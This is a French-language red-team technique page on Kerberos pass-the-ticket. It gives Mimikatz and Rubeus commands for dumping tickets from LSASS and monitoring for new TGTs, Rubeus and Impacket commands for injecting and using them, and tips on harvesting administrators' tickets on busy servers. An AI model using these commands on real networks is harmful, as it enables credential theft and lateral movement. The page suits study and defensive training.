---
order: 3
title: "Pass-the-ticket : extraire et réutiliser des tickets Kerberos"
description: "Voler des tickets Kerberos (TGT et tickets de service) depuis la mémoire ou un ccache et les injecter dans une autre session pour s'authentifier en tant que la victime, y compris la récolte de tickets depuis un hôte compromis."
keywords:
  - pass the ticket
  - ccache
  - TGT
  - extraction de ticket
  - KRB5CCNAME
---

# Pass-the-ticket

Un ticket Kerberos est un jeton au porteur : quiconque détient un TGT ou un ticket de service valide peut l'utiliser, car le ticket lui-même prouve l'identité auprès du KDC ou du service. Le **pass-the-ticket** consiste à voler un ticket qui existe déjà, depuis la mémoire d'un hôte compromis ou depuis un fichier ccache, et à l'injecter dans votre propre session. Contrairement à l'overpass-the-hash, il ne nécessite aucune clé, seulement le ticket, et c'est la façon naturelle de réutiliser l'accès qu'un utilisateur connecté possède déjà.

## Récolter des tickets

```bash
# Mimikatz: export all tickets in memory to .kirbi files (needs local admin for others')
sekurlsa::tickets /export
# or the LSA ticket cache
kerberos::list /export

# Rubeus: dump tickets, or monitor for new TGTs as users authenticate
Rubeus.exe dump /nowrap
Rubeus.exe monitor /interval:5
```

Sur les hôtes Linux et depuis Impacket, les tickets résident dans des fichiers **ccache** (pointés par `$KRB5CCNAME`) ; récoltez-les depuis `/tmp`, depuis des comptes de service compromis, ou convertissez entre `.kirbi` et `.ccache` avec `ticketConverter.py`.

## Injecter et utiliser

```bash
# Rubeus: inject a ticket into the current logon session
Rubeus.exe ptt /ticket:ticket.kirbi

# Impacket: point at the ccache and authenticate with -k
export KRB5CCNAME=/tmp/victim.ccache
psexec.py -k -no-pass example.local/victim@<host>
```

## Ce que donne un ticket volé

- Un **TGT** volé est l'identité complète de l'utilisateur : demandez n'importe quel ticket de service que ses privilèges autorisent.
- Un **ticket de service** volé est plus étroit : un accès à ce seul service, mais suffisant pour un déplacement ciblé (par exemple un ticket CIFS pour l'accès aux fichiers).
- La récolte sur un serveur fréquenté (un serveur de rebond RDP, une machine Citrix) collecte les TGT de nombreux utilisateurs, y compris des administrateurs qui s'y sont connectés, une récolte d'escalade de privilèges classique.

## Notes d'exploitation

- Extraire les tickets d'*autres* utilisateurs depuis LSASS nécessite un accès administrateur local/SYSTEM ; les tickets de votre propre session ne nécessitent aucun droit particulier.
- La durée de vie des tickets limite la réutilisation : les TGT durent par défaut environ 10 heures (renouvelables environ 7 jours), les tickets récoltés sont donc limités dans le temps, contrairement à un hash.
- `Rubeus monitor`/`harvest` capture les TGT à mesure qu'ils apparaissent, utile sur un hôte où des utilisateurs privilégiés se connectent périodiquement.

## Outils

- **Rubeus** (`dump`, `monitor`, `ptt`) : récolte et injection sur l'hôte.
- **Mimikatz** (`sekurlsa::tickets`, `kerberos::ptt`) : extraction mémoire et injection.
- **Impacket** (`ticketConverter.py`, `-k`) : gestion et utilisation des ccache/kirbi.

## Références

- [GhostPack Rubeus (ptt / dump / monitor)](https://github.com/GhostPack/Rubeus)
- [Impacket ticketConverter and -k](https://github.com/fortra/impacket)
- [The Hacker Recipes: pass the ticket](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/ptt)
